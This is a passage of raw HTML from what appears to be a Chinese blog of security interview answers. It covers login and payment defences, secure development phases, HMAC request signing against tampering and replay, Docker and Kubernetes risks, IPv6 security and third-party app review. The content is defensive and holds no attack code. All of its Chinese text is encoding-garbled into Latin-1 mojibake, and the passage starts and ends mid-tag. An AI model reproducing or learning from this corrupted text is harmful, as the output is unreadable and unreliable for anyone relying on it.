href="#é˜²èŒƒæªæ–½ï¼š-ç™»å½•ï¼šä½¿ç”¨éªŒè¯ç ã€IP-é¢‘ç‡é™åˆ¶ã€äºŒæ¬¡éªŒè¯ï¼ˆ2FAï¼‰ã€‚-æ³¨å†Œï¼šé™åˆ¶æ‰¹é‡æ³¨å†Œï¼ˆå¦‚åŸºäºè¡Œä¸ºåˆ†ææ£€æµ‹ï¼‰ã€‚-ä¿®æ”¹å¯†ç ï¼šè¦æ±‚è¾“å…¥æ—§å¯†ç ï¼Œæˆ–è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼ˆçŸ­ä¿¡-é‚®ä»¶ï¼‰ã€‚-æ”¯ä»˜ï¼šä½¿ç”¨-HMAC-ç­¾åï¼Œé˜²æ­¢è¯·æ±‚ç¯¡æ”¹ï¼Œå¯ç”¨-å¹‚ç­‰æœºåˆ¶-é¿å…é‡å¤æ”¯ä»˜ã€‚" class="headerlink" title="é˜²èŒƒæªæ–½ï¼š- ç™»å½•ï¼šä½¿ç”¨éªŒè¯ç ã€IP é¢‘ç‡é™åˆ¶ã€äºŒæ¬¡éªŒè¯ï¼ˆ2FAï¼‰ã€‚- æ³¨å†Œï¼šé™åˆ¶æ‰¹é‡æ³¨å†Œï¼ˆå¦‚åŸºäºè¡Œä¸ºåˆ†ææ£€æµ‹ï¼‰ã€‚- ä¿®æ”¹å¯†ç ï¼šè¦æ±‚è¾“å…¥æ—§å¯†ç ï¼Œæˆ–è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼ˆçŸ­ä¿¡&#x2F;é‚®ä»¶ï¼‰ã€‚- æ”¯ä»˜ï¼šä½¿ç”¨ HMAC ç­¾åï¼Œé˜²æ­¢è¯·æ±‚ç¯¡æ”¹ï¼Œå¯ç”¨ å¹‚ç­‰æœºåˆ¶ é¿å…é‡å¤æ”¯ä»˜ã€‚"></a><strong>é˜²èŒƒæªæ–½</strong>ï¼š<br>- <strong>ç™»å½•</strong>ï¼šä½¿ç”¨éªŒè¯ç ã€IP é¢‘ç‡é™åˆ¶ã€äºŒæ¬¡éªŒè¯ï¼ˆ2FAï¼‰ã€‚<br>- <strong>æ³¨å†Œ</strong>ï¼šé™åˆ¶æ‰¹é‡æ³¨å†Œï¼ˆå¦‚åŸºäºè¡Œä¸ºåˆ†ææ£€æµ‹ï¼‰ã€‚<br>- <strong>ä¿®æ”¹å¯†ç </strong>ï¼šè¦æ±‚è¾“å…¥æ—§å¯†ç ï¼Œæˆ–è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼ˆçŸ­ä¿¡&#x2F;é‚®ä»¶ï¼‰ã€‚<br>- <strong>æ”¯ä»˜</strong>ï¼šä½¿ç”¨ <strong>HMAC ç­¾å</strong>ï¼Œé˜²æ­¢è¯·æ±‚ç¯¡æ”¹ï¼Œå¯ç”¨ <strong>å¹‚ç­‰æœºåˆ¶</strong> é¿å…é‡å¤æ”¯ä»˜ã€‚</h2><h4 id="æ–°åº”ç”¨å¦‚ä½•è¯„ä¼°å®‰å…¨é£é™©ï¼Ÿ"><a href="#æ–°åº”ç”¨å¦‚ä½•è¯„ä¼°å®‰å…¨é£é™©ï¼Ÿ" class="headerlink" title="æ–°åº”ç”¨å¦‚ä½•è¯„ä¼°å®‰å…¨é£é™©ï¼Ÿ"></a><strong>æ–°åº”ç”¨å¦‚ä½•è¯„ä¼°å®‰å…¨é£é™©ï¼Ÿ</strong></h4><h2 id="è¯„ä¼°æ–¹æ³•ï¼š1-æ”»å‡»é¢åˆ†æï¼š-è¯†åˆ«-APIã€å‰ç«¯ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆçš„æ½œåœ¨æ¼æ´ç‚¹ã€‚2-èº«ä»½è®¤è¯ä¸è®¿é—®æ§åˆ¶ï¼š-ç¡®ä¿ä½¿ç”¨-JWTã€OAuth-è¿›è¡Œèº«ä»½è®¤è¯ï¼Œé¿å…è¶Šæƒè®¿é—®ã€‚3-æ•°æ®ä¿æŠ¤ï¼š-æ•æ„Ÿæ•°æ®åŠ å¯†å­˜å‚¨ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²ã€‚4-ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼š-è¯„ä¼°æ”¯ä»˜ã€äº¤æ˜“ç­‰å…³é”®åŠŸèƒ½ï¼Œé˜²æ­¢æ¶æ„åˆ©ç”¨ã€‚"><a href="#è¯„ä¼°æ–¹æ³•ï¼š1-æ”»å‡»é¢åˆ†æï¼š-è¯†åˆ«-APIã€å‰ç«¯ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆçš„æ½œåœ¨æ¼æ´ç‚¹ã€‚2-èº«ä»½è®¤è¯ä¸è®¿é—®æ§åˆ¶ï¼š-ç¡®ä¿ä½¿ç”¨-JWTã€OAuth-è¿›è¡Œèº«ä»½è®¤è¯ï¼Œé¿å…è¶Šæƒè®¿é—®ã€‚3-æ•°æ®ä¿æŠ¤ï¼š-æ•æ„Ÿæ•°æ®åŠ å¯†å­˜å‚¨ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²ã€‚4-ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼š-è¯„ä¼°æ”¯ä»˜ã€äº¤æ˜“ç­‰å…³é”®åŠŸèƒ½ï¼Œé˜²æ­¢æ¶æ„åˆ©ç”¨ã€‚" class="headerlink" title="è¯„ä¼°æ–¹æ³•ï¼š1. æ”»å‡»é¢åˆ†æï¼š   - è¯†åˆ« APIã€å‰ç«¯ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆçš„æ½œåœ¨æ¼æ´ç‚¹ã€‚2. èº«ä»½è®¤è¯ä¸è®¿é—®æ§åˆ¶ï¼š   - ç¡®ä¿ä½¿ç”¨ JWTã€OAuth è¿›è¡Œèº«ä»½è®¤è¯ï¼Œé¿å…è¶Šæƒè®¿é—®ã€‚3. æ•°æ®ä¿æŠ¤ï¼š   - æ•æ„Ÿæ•°æ®åŠ å¯†å­˜å‚¨ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²ã€‚4. ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼š   - è¯„ä¼°æ”¯ä»˜ã€äº¤æ˜“ç­‰å…³é”®åŠŸèƒ½ï¼Œé˜²æ­¢æ¶æ„åˆ©ç”¨ã€‚"></a><strong>è¯„ä¼°æ–¹æ³•</strong>ï¼š<br>1. <strong>æ”»å‡»é¢åˆ†æ</strong>ï¼š<br>   - è¯†åˆ« APIã€å‰ç«¯ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆçš„æ½œåœ¨æ¼æ´ç‚¹ã€‚<br>2. <strong>èº«ä»½è®¤è¯ä¸è®¿é—®æ§åˆ¶</strong>ï¼š<br>   - ç¡®ä¿ä½¿ç”¨ JWTã€OAuth è¿›è¡Œèº«ä»½è®¤è¯ï¼Œé¿å…è¶Šæƒè®¿é—®ã€‚<br>3. <strong>æ•°æ®ä¿æŠ¤</strong>ï¼š<br>   - æ•æ„Ÿæ•°æ®åŠ å¯†å­˜å‚¨ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²ã€‚<br>4. <strong>ä¸šåŠ¡é€»è¾‘æ¼æ´</strong>ï¼š<br>   - è¯„ä¼°æ”¯ä»˜ã€äº¤æ˜“ç­‰å…³é”®åŠŸèƒ½ï¼Œé˜²æ­¢æ¶æ„åˆ©ç”¨ã€‚</h2><h4 id="éœ€æ±‚é˜¶æ®µã€å„åˆ†é˜¶æ®µå®‰å…¨è¯„ä¼°çš„ä¾§é‡ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#éœ€æ±‚é˜¶æ®µã€å„åˆ†é˜¶æ®µå®‰å…¨è¯„ä¼°çš„ä¾§é‡ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="éœ€æ±‚é˜¶æ®µã€å„åˆ†é˜¶æ®µå®‰å…¨è¯„ä¼°çš„ä¾§é‡ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>éœ€æ±‚é˜¶æ®µã€å„åˆ†é˜¶æ®µå®‰å…¨è¯„ä¼°çš„ä¾§é‡ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h4><p><strong>ä¸åŒé˜¶æ®µçš„å®‰å…¨è¯„ä¼°é‡ç‚¹</strong>ï¼š</p><ol><li><p><strong>éœ€æ±‚é˜¶æ®µ</strong>ï¼š</p><ul><li>è¯†åˆ«ä¸šåŠ¡é€»è¾‘ä¸­çš„æ½œåœ¨å®‰å…¨é£é™©ï¼Œå¦‚æ”¯ä»˜æµç¨‹ã€æƒé™ç®¡ç†ç­‰ã€‚</li><li>ç¡®ä¿åˆè§„æ€§ï¼ˆGDPRã€PCI DSS ç­‰ï¼‰ã€‚</li></ul></li><li><p><strong>è®¾è®¡é˜¶æ®µ</strong>ï¼š</p><ul><li>é‡‡ç”¨ <strong>æœ€å°æƒé™åŸåˆ™</strong> è®¾è®¡è®¿é—®æ§åˆ¶ã€‚</li><li>è¯„ä¼°åŠ å¯†æ–¹æ¡ˆï¼Œé˜²æ­¢æ•°æ®æ³„éœ²ã€‚</li></ul></li><li><p><strong>å¼€å‘é˜¶æ®µ</strong>ï¼š</p><ul><li>ä»£ç å®¡è®¡ï¼ˆSASTï¼‰ï¼Œæ£€æŸ¥ XSSã€SQL æ³¨å…¥ç­‰æ¼æ´ã€‚</li><li>ä»£ç å®‰å…¨è§„èŒƒï¼ˆç¦æ­¢ç¡¬ç¼–ç å¯†é’¥ç­‰ï¼‰ã€‚</li></ul></li><li><p><strong>æµ‹è¯•é˜¶æ®µ</strong>ï¼š</p><ul><li>è¿›è¡Œé»‘ç›’æµ‹è¯•ï¼ˆDASTï¼‰ï¼Œæ¨¡æ‹Ÿæ”»å‡»è€…è§†è§’æŸ¥æ‰¾æ¼æ´ã€‚</li></ul></li><li><p><strong>ä¸Šçº¿å</strong>ï¼š</p><ul><li>å¯ç”¨ <strong>å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰</strong>ï¼Œç›‘æ§å¼‚å¸¸è¡Œä¸ºã€‚</li><li>å®šæœŸæ¼æ´æ‰«æï¼Œé˜²æ­¢å®‰å…¨å›å½’ã€‚</li></ul></li></ol><hr><h4 id="æ¥å£-B-çš„å‚æ•°æ˜¯ä»æ¥å£-A-çš„å“åº”ä¸­è·å–çš„ï¼Œä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"><a href="#æ¥å£-B-çš„å‚æ•°æ˜¯ä»æ¥å£-A-çš„å“åº”ä¸­è·å–çš„ï¼Œä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ" class="headerlink" title="æ¥å£ B çš„å‚æ•°æ˜¯ä»æ¥å£ A çš„å“åº”ä¸­è·å–çš„ï¼Œä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"></a><strong>æ¥å£ B çš„å‚æ•°æ˜¯ä»æ¥å£ A çš„å“åº”ä¸­è·å–çš„ï¼Œä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ</strong></h4><p><strong>å¸¸è§é£é™©</strong>ï¼š</p><ul><li><strong>ä¿¡ä»»é“¾é—®é¢˜</strong>ï¼šæ¥å£ A çš„æ•°æ®æœªç»æ ¡éªŒç›´æ¥ä¼ é€’ç»™æ¥å£ Bï¼Œå¯¼è‡´æ¼æ´ä¼ æ’­ã€‚</li><li><strong>æ•°æ®ç¯¡æ”¹</strong>ï¼šå¦‚æœæ”»å‡»è€…èƒ½åŠ«æŒæ¥å£ A å“åº”ï¼Œå¯ä¼ªé€ æ•°æ®å½±å“æ¥å£ Bã€‚</li><li><strong>è¯·æ±‚ä¼ªé€ </strong>ï¼šå¦‚æœæ¥å£ A è¿”å›å¯è¢«æ»¥ç”¨çš„ URLï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚ã€‚</li></ul><h2 id="é˜²èŒƒæªæ–½ï¼š-æ•°æ®å®Œæ•´æ€§æ ¡éªŒï¼šæ¥å£-A-çš„å“åº”å¿…é¡»è¿›è¡Œç­¾åéªŒè¯ã€‚-é™åˆ¶æ•°æ®æ¥æºï¼šæ¥å£-B-ä»…æ¥å—å¯ä¿¡-API-çš„æ•°æ®ã€‚-ä½¿ç”¨-Token-å…³è”è¯·æ±‚ï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹ã€‚"><a href="#é˜²èŒƒæªæ–½ï¼š-æ•°æ®å®Œæ•´æ€§æ ¡éªŒï¼šæ¥å£-A-çš„å“åº”å¿…é¡»è¿›è¡Œç­¾åéªŒè¯ã€‚-é™åˆ¶æ•°æ®æ¥æºï¼šæ¥å£-B-ä»…æ¥å—å¯ä¿¡-API-çš„æ•°æ®ã€‚-ä½¿ç”¨-Token-å…³è”è¯·æ±‚ï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹ã€‚" class="headerlink" title="é˜²èŒƒæªæ–½ï¼š- æ•°æ®å®Œæ•´æ€§æ ¡éªŒï¼šæ¥å£ A çš„å“åº”å¿…é¡»è¿›è¡Œç­¾åéªŒè¯ã€‚- é™åˆ¶æ•°æ®æ¥æºï¼šæ¥å£ B ä»…æ¥å—å¯ä¿¡ API çš„æ•°æ®ã€‚- ä½¿ç”¨ Token å…³è”è¯·æ±‚ï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹ã€‚"></a><strong>é˜²èŒƒæªæ–½</strong>ï¼š<br>- <strong>æ•°æ®å®Œæ•´æ€§æ ¡éªŒ</strong>ï¼šæ¥å£ A çš„å“åº”å¿…é¡»è¿›è¡Œç­¾åéªŒè¯ã€‚<br>- <strong>é™åˆ¶æ•°æ®æ¥æº</strong>ï¼šæ¥å£ B ä»…æ¥å—å¯ä¿¡ API çš„æ•°æ®ã€‚<br>- <strong>ä½¿ç”¨ Token å…³è”è¯·æ±‚</strong>ï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹ã€‚</h2><h4 id="æ–°çš„-API-æ¥å£ä¸Šçº¿æ—¶ï¼Œå¦‚ä½•è®¾è®¡ä½¿å…¶é¿å…å‡ºç°è¯·æ±‚ç¯¡æ”¹å’Œè¯·æ±‚é‡æ”¾ï¼Ÿ"><a href="#æ–°çš„-API-æ¥å£ä¸Šçº¿æ—¶ï¼Œå¦‚ä½•è®¾è®¡ä½¿å…¶é¿å…å‡ºç°è¯·æ±‚ç¯¡æ”¹å’Œè¯·æ±‚é‡æ”¾ï¼Ÿ" class="headerlink" title="æ–°çš„ API æ¥å£ä¸Šçº¿æ—¶ï¼Œå¦‚ä½•è®¾è®¡ä½¿å…¶é¿å…å‡ºç°è¯·æ±‚ç¯¡æ”¹å’Œè¯·æ±‚é‡æ”¾ï¼Ÿ"></a><strong>æ–°çš„ API æ¥å£ä¸Šçº¿æ—¶ï¼Œå¦‚ä½•è®¾è®¡ä½¿å…¶é¿å…å‡ºç°è¯·æ±‚ç¯¡æ”¹å’Œè¯·æ±‚é‡æ”¾ï¼Ÿ</strong></h4><p><strong>é˜²ç¯¡æ”¹æªæ–½</strong>ï¼š</p><ul><li><strong>å‚æ•°ç­¾å</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>HMAC-SHA256</strong> è®¡ç®—è¯·æ±‚å‚æ•°ç­¾åï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac, hashlib</span><br><span class="line">secret = <span class="string">b&#x27;secret-key&#x27;</span></span><br><span class="line">message = <span class="string">b&#x27;param1=value1&amp;param2=value2&#x27;</span></span><br><span class="line">signature = hmac.new(secret, message, hashlib.sha256).hexdigest()</span><br></pre></td></tr></table></figure></li><li>æœåŠ¡å™¨ç«¯æ ¡éªŒç­¾åï¼Œé˜²æ­¢å‚æ•°è¢«ç¯¡æ”¹ã€‚</li></ul></li></ul><h2 id="é˜²é‡æ”¾æªæ–½ï¼š-ä½¿ç”¨æ—¶é—´æˆ³-éšæœºæ•°ï¼š-åœ¨è¯·æ±‚ä¸­æ·»åŠ -timestamp-nonceï¼Œç¡®ä¿å”¯ä¸€æ€§ï¼š-æœåŠ¡å™¨ç«¯å­˜å‚¨å·²ä½¿ç”¨çš„-nonceï¼Œé˜²æ­¢é‡å¤è¯·æ±‚ã€‚"><a href="#é˜²é‡æ”¾æªæ–½ï¼š-ä½¿ç”¨æ—¶é—´æˆ³-éšæœºæ•°ï¼š-åœ¨è¯·æ±‚ä¸­æ·»åŠ -timestamp-nonceï¼Œç¡®ä¿å”¯ä¸€æ€§ï¼š-æœåŠ¡å™¨ç«¯å­˜å‚¨å·²ä½¿ç”¨çš„-nonceï¼Œé˜²æ­¢é‡å¤è¯·æ±‚ã€‚" class="headerlink" title="é˜²é‡æ”¾æªæ–½ï¼š- ä½¿ç”¨æ—¶é—´æˆ³+éšæœºæ•°ï¼š  - åœ¨è¯·æ±‚ä¸­æ·»åŠ  timestamp + nonceï¼Œç¡®ä¿å”¯ä¸€æ€§ï¼š      - æœåŠ¡å™¨ç«¯å­˜å‚¨å·²ä½¿ç”¨çš„ nonceï¼Œé˜²æ­¢é‡å¤è¯·æ±‚ã€‚"></a><strong>é˜²é‡æ”¾æªæ–½</strong>ï¼š<br>- <strong>ä½¿ç”¨æ—¶é—´æˆ³+éšæœºæ•°</strong>ï¼š<br>  - åœ¨è¯·æ±‚ä¸­æ·»åŠ  <code>timestamp</code> + <code>nonce</code>ï¼Œç¡®ä¿å”¯ä¸€æ€§ï¼š<br>    <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1700000000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;random-uuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac_signature&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>  - æœåŠ¡å™¨ç«¯å­˜å‚¨å·²ä½¿ç”¨çš„ <code>nonce</code>ï¼Œé˜²æ­¢é‡å¤è¯·æ±‚ã€‚</h2><h4 id="Docker-å®¹å™¨ä»¥åŠ-K8s-æœ‰å“ªäº›é£é™©ï¼Ÿ"><a href="#Docker-å®¹å™¨ä»¥åŠ-K8s-æœ‰å“ªäº›é£é™©ï¼Ÿ" class="headerlink" title="Docker å®¹å™¨ä»¥åŠ K8s æœ‰å“ªäº›é£é™©ï¼Ÿ"></a><strong>Docker å®¹å™¨ä»¥åŠ K8s æœ‰å“ªäº›é£é™©ï¼Ÿ</strong></h4><p><strong>Docker é£é™©</strong>ï¼š</p><ul><li><strong>å®¹å™¨é€ƒé€¸</strong>ï¼šæ”»å‡»è€…å¯åˆ©ç”¨ <strong>CVE-2019-5736</strong> ç­‰æ¼æ´è·å–å®¿ä¸»æœºæƒé™ã€‚</li><li><strong>ä¸å®‰å…¨é•œåƒ</strong>ï¼šä½¿ç”¨æ¥æºä¸æ˜çš„é•œåƒï¼Œå¯èƒ½å¸¦åé—¨æˆ–æ¶æ„ä»£ç ã€‚</li><li><strong>æƒé™æå‡</strong>ï¼šå®¹å™¨è¿è¡Œæ—¶ä½¿ç”¨ <code>--privileged</code> é€‰é¡¹ï¼Œå¯¼è‡´æƒé™è¿‡é«˜ã€‚</li></ul><p><strong>K8s é£é™©</strong>ï¼š</p><ul><li><strong>API æ»¥ç”¨</strong>ï¼šK8s API æœªæˆæƒè®¿é—®ï¼Œå¯¼è‡´æ•æ„Ÿæ•°æ®æ³„éœ²ã€‚</li><li><strong>RBAC é…ç½®é”™è¯¯</strong>ï¼šé”™è¯¯çš„è§’è‰²ç»‘å®šï¼ˆå¦‚ <code>cluster-admin</code>ï¼‰å¯¼è‡´æƒé™æ‰©å¤§ã€‚</li><li><strong>æœªéš”ç¦»å‘½åç©ºé—´</strong>ï¼šå¤šä¸ªåº”ç”¨å…±äº«å‘½åç©ºé—´ï¼Œå¢åŠ æ”»å‡»é¢ã€‚</li></ul><h2 id="é˜²èŒƒæªæ–½ï¼š-ä½¿ç”¨-æœ€å°æƒé™åŸåˆ™-é™åˆ¶å®¹å™¨å’Œ-K8s-èµ„æºè®¿é—®ã€‚-å¯ç”¨-Pod-Security-Policyï¼Œé¿å…è¿è¡Œé«˜æƒé™å®¹å™¨ã€‚-å®šæœŸæ‰«æå®¹å™¨é•œåƒï¼Œé˜²æ­¢ä¾›åº”é“¾æ”»å‡»ã€‚"><a href="#é˜²èŒƒæªæ–½ï¼š-ä½¿ç”¨-æœ€å°æƒé™åŸåˆ™-é™åˆ¶å®¹å™¨å’Œ-K8s-èµ„æºè®¿é—®ã€‚-å¯ç”¨-Pod-Security-Policyï¼Œé¿å…è¿è¡Œé«˜æƒé™å®¹å™¨ã€‚-å®šæœŸæ‰«æå®¹å™¨é•œåƒï¼Œé˜²æ­¢ä¾›åº”é“¾æ”»å‡»ã€‚" class="headerlink" title="é˜²èŒƒæªæ–½ï¼š- ä½¿ç”¨ æœ€å°æƒé™åŸåˆ™ é™åˆ¶å®¹å™¨å’Œ K8s èµ„æºè®¿é—®ã€‚- å¯ç”¨ Pod Security Policyï¼Œé¿å…è¿è¡Œé«˜æƒé™å®¹å™¨ã€‚- å®šæœŸæ‰«æå®¹å™¨é•œåƒï¼Œé˜²æ­¢ä¾›åº”é“¾æ”»å‡»ã€‚"></a><strong>é˜²èŒƒæªæ–½</strong>ï¼š<br>- ä½¿ç”¨ <strong>æœ€å°æƒé™åŸåˆ™</strong> é™åˆ¶å®¹å™¨å’Œ K8s èµ„æºè®¿é—®ã€‚<br>- å¯ç”¨ <strong>Pod Security Policy</strong>ï¼Œé¿å…è¿è¡Œé«˜æƒé™å®¹å™¨ã€‚<br>- å®šæœŸæ‰«æå®¹å™¨é•œåƒï¼Œé˜²æ­¢ä¾›åº”é“¾æ”»å‡»ã€‚</h2><h4 id="IPv6-å’Œ-IPv4-å®‰å…¨å·®å¼‚ï¼Ÿ"><a href="#IPv6-å’Œ-IPv4-å®‰å…¨å·®å¼‚ï¼Ÿ" class="headerlink" title="IPv6 å’Œ IPv4 å®‰å…¨å·®å¼‚ï¼Ÿ"></a><strong>IPv6 å’Œ IPv4 å®‰å…¨å·®å¼‚ï¼Ÿ</strong></h4><p><strong>ä¸»è¦å®‰å…¨å·®å¼‚</strong>ï¼š</p><ol><li><strong>åœ°å€å¯ç”¨æ€§</strong>ï¼š<ul><li>IPv6 åœ°å€ç©ºé—´æ›´å¤§ï¼Œä¸å†ä¾èµ– NAT è¿›è¡Œåœ°å€å¤ç”¨ï¼Œä½†æš´éœ²é¢æ›´å¤§ã€‚</li></ul></li><li><strong>é»˜è®¤å¯ç”¨ ICMPv6</strong>ï¼š<ul><li>æ”»å‡»è€…å¯åˆ©ç”¨ <strong>ICMPv6 é‚»å±…å‘ç°åè®®</strong> å‘èµ· MITM æ”»å‡»ã€‚</li></ul></li><li><strong>æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®ï¼ˆSLAACï¼‰</strong>ï¼š<ul><li>è®¾å¤‡å¯è‡ªåŠ¨åˆ†é… IPv6 åœ°å€ï¼Œå¯èƒ½è¢«æ¶æ„åˆ©ç”¨è¿›è¡Œä¼ªé€ ã€‚</li></ul></li></ol><h2 id="é˜²èŒƒæªæ–½ï¼š-é™åˆ¶-IPv6-è®¿é—®èŒƒå›´ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™æ‹¦æˆªå¤–éƒ¨æœªæˆæƒæµé‡ã€‚-å¯ç”¨-RA-Guardï¼Œé˜²æ­¢æ¶æ„-IPv6-è·¯ç”±å…¬å‘Šã€‚"><a href="#é˜²èŒƒæªæ–½ï¼š-é™åˆ¶-IPv6-è®¿é—®èŒƒå›´ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™æ‹¦æˆªå¤–éƒ¨æœªæˆæƒæµé‡ã€‚-å¯ç”¨-RA-Guardï¼Œé˜²æ­¢æ¶æ„-IPv6-è·¯ç”±å…¬å‘Šã€‚" class="headerlink" title="é˜²èŒƒæªæ–½ï¼š- é™åˆ¶ IPv6 è®¿é—®èŒƒå›´ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™æ‹¦æˆªå¤–éƒ¨æœªæˆæƒæµé‡ã€‚- å¯ç”¨ RA-Guardï¼Œé˜²æ­¢æ¶æ„ IPv6 è·¯ç”±å…¬å‘Šã€‚"></a><strong>é˜²èŒƒæªæ–½</strong>ï¼š<br>- <strong>é™åˆ¶ IPv6 è®¿é—®èŒƒå›´</strong>ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™æ‹¦æˆªå¤–éƒ¨æœªæˆæƒæµé‡ã€‚<br>- <strong>å¯ç”¨ RA-Guard</strong>ï¼Œé˜²æ­¢æ¶æ„ IPv6 è·¯ç”±å…¬å‘Šã€‚</h2><h4 id="ä¸‰æ–¹å¼•å…¥çš„åº”ç”¨å’Œè‡ªç ”åº”ç”¨è¯„ä¼°çš„å·®å¼‚æœ‰å“ªäº›ï¼Ÿ"><a href="#ä¸‰æ–¹å¼•å…¥çš„åº”ç”¨å’Œè‡ªç ”åº”ç”¨è¯„ä¼°çš„å·®å¼‚æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="ä¸‰æ–¹å¼•å…¥çš„åº”ç”¨å’Œè‡ªç ”åº”ç”¨è¯„ä¼°çš„å·®å¼‚æœ‰å“ªäº›ï¼Ÿ"></a><strong>ä¸‰æ–¹å¼•å…¥çš„åº”ç”¨å’Œè‡ªç ”åº”ç”¨è¯„ä¼°çš„å·®å¼‚æœ‰å“ªäº›ï¼Ÿ</strong></h4><p><strong>ä¸‰æ–¹åº”ç”¨è¯„ä¼°</strong>ï¼š</p><ul><li>ä¸»è¦å…³æ³¨ <strong>ä¾›åº”é“¾æ”»å‡»</strong>ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç æˆ–åé—¨ã€‚</li><li>éœ€è¦ <strong>ä»£ç å®¡è®¡</strong>ï¼Œé¿å…ç¬¬ä¸‰æ–¹ SDK æ³„éœ²æ•°æ®ã€‚</li></ul><h2 id="è‡ªç ”åº”ç”¨è¯„ä¼°ï¼š-é‡ç‚¹å…³æ³¨-ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼ˆå¦‚æ”¯ä»˜ç»•è¿‡ã€æƒé™è¶Šæƒï¼‰ã€‚-ä»£ç å®‰å…¨è§„èŒƒéœ€ä¸¥æ ¼æ‰§è¡Œï¼Œé˜²æ­¢å†…éƒ¨æ³„éœ²é£é™©ã€‚"><a href="#è‡ªç ”åº”ç”¨è¯„ä¼°ï¼š-é‡ç‚¹å…³æ³¨-ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼ˆå¦‚æ”¯ä»˜ç»•è¿‡ã€æƒé™è¶Šæƒï¼‰ã€‚-ä»£ç å®‰å…¨è§„èŒƒéœ€ä¸¥æ ¼æ‰§è¡Œï¼Œé˜²æ­¢å†…éƒ¨æ³„éœ²é£é™©ã€‚" class="headerlink" title="è‡ªç ”åº”ç”¨è¯„ä¼°ï¼š- é‡ç‚¹å…³æ³¨ ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼ˆå¦‚æ”¯ä»˜ç»•è¿‡ã€æƒé™è¶Šæƒï¼‰ã€‚- ä»£ç å®‰å…¨è§„èŒƒéœ€ä¸¥æ ¼æ‰§è¡Œï¼Œé˜²æ­¢å†…éƒ¨æ³„éœ²é£é™©ã€‚"></a><strong>è‡ªç ”åº”ç”¨è¯„ä¼°</strong>ï¼š<br>- é‡ç‚¹å…³æ³¨ <strong>ä¸šåŠ¡é€»è¾‘æ¼æ´</strong>ï¼ˆå¦‚æ”¯ä»˜ç»•è¿‡ã€æƒé™è¶Šæƒï¼‰ã€‚<br>- ä»£ç å®‰å…¨è§„èŒƒéœ€ä¸¥æ ¼æ‰§è¡Œï¼Œé˜²æ­¢å†…éƒ¨æ³„éœ²é£é™©ã€‚</h2><h4 id="é‡‘èä¸šåŠ¡æœ‰ä½•ç‰¹æ€§ï¼Ÿ"><a href="#é‡‘èä¸šåŠ¡æœ‰ä½•ç‰¹æ€§ï¼Ÿ" class="headerlink" title="é‡‘èä¸šåŠ¡æœ‰ä½•ç‰¹æ€§ï¼Ÿ"></a><strong>é‡‘èä¸šåŠ¡æœ‰ä½•ç‰¹æ€§ï¼Ÿ</strong></h4><ol><li><strong>é«˜å®‰å…¨æ€§</strong>ï¼š<ul><li>éœ€ç¬¦åˆ <strong>PCI DSS</strong>ã€GDPR ç­‰åˆè§„è¦æ±‚ã€‚</li></ul></li><li><strong>å¼ºèº«ä»½è®¤è¯</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>å¤šå› å­è®¤è¯ï¼ˆMFAï¼‰</strong>ï¼Œé˜²æ­¢è´¦æˆ·è¢«ç›—ã€‚</li></ul></li><li><strong>äº¤æ˜“ä¸å¯æŠµèµ–æ€§</strong>ï¼š<ul><li>é‡‡ç”¨ <strong>æ•°å­—ç­¾å</strong> ä¿éšœäº¤æ˜“çœŸå®æ€§ã€‚</li></ul></li></ol><hr><h4 